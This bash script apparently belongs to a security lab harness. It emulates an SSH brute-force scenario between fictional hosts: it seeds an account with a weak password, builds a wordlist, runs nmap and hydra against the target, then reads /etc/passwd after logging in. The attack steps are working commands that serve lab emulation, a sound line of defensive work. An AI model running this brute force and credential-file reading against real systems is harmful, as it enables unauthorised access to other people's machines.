#!/usr/bin/env bash
# S01 — SSH brute force to successful login. Attacker: Barad-dûr → Moria.
# Params used: ACCOUNT, SUCCEED, NOISE, SRC_IP. See scenarios/S01-ssh-bruteforce.md.
run_scenario() {
  local PW="Autumn2026"                    # fake lab password for the seeded account
  local WL="/tmp/s01-wordlist.txt"

  step "setup: seed the target account on Moria (admin)"
  on_lin "setup" "sudo useradd -m -s /bin/bash '$ACCOUNT' 2>/dev/null; echo '$ACCOUNT:$PW' | sudo chpasswd"
  note "seeded $ACCOUNT with weak password on Moria"

  step "build a wordlist on Barad-dûr (real password present: $SUCCEED)"
  run "wordlist" "printf 'password\\n123456\\nletmein\\nSummer2026\\nWinter2025!\\n' > $WL"
  [[ "$SUCCEED" == "yes" ]] && run "wordlist+" "echo '$PW' >> $WL" \
                            || run "wordlist-" "echo 'NotThePassword2026' >> $WL"

  step "recon then brute force"
  run "nmap"  "nmap -Pn -p22 --open $VICLIN_IP"
  run "hydra" "hydra -l '$ACCOUNT' -P $WL ssh://$VICLIN_IP -t 4 -f || true"

  if [[ "$SUCCEED" == "yes" ]]; then
    step "landed — first actions as $ACCOUNT"
    on_lin_as "$ACCOUNT" "post-login" "id; uname -a; tail -5 /etc/passwd"
    note "successful login as $ACCOUNT, ran id/uname/passwd-read"
  else
    note "brute force did not land (real password absent from list)"
  fi

  noise_lin
  run "cleanup-wl" "rm -f $WL"
}
